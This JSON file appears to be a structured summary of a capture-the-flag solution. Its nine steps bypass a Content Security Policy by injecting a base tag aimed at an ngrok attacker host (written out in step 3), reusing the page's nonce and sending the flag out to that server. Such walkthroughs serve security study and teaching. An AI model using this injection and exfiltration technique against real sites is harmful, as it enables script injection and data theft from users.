{
    "AttackModel": {
        "Steps": [
            {
                "StepNumber": 1,
                "StepString": "Identified the need to perform an XSS attack, but noted that a Content Security Policy (CSP) was in place to prevent this."
            },
            {
                "StepNumber": 2,
                "StepString": "Noticed that the page used relative JavaScript paths, and that the scripts were always executed due to the `nonce` in the CSP."
            },
            {
                "StepNumber": 3,
                "StepString": "Changed the base URI of the page to attacker's own server using `<base href=//351b-42-60-216-15.ngrok.io>`."
            },
            {
                "StepNumber": 4,
                "StepString": "Noted that the relative paths would now load scripts from the attacker's server, which would usually not be possible due to the CSP."
            },
            {
                "StepNumber": 5,
                "StepString": "Hosted a file at `/static/page.js` on the attacker server and enabled CORS to execute arbitrary JavaScript through this file."
            },
            {
                "StepNumber": 6,
                "StepString": "Used the `nonce` to bypass the CSP again in order to exfiltrate data."
            },
            {
                "StepNumber": 7,
                "StepString": "Created a new script element, added the appropriate `nonce` from the rest of the script tags, and set the script source to the data wanted to exfiltrate."
            },
            {
                "StepNumber": 8,
                "StepString": "Appended the new script to the body of the document."
            },
            {
                "StepNumber": 9,
                "StepString": "Received the flag on the attacker server, indicating the successful execution of the attack."
            }
        ]
    }
}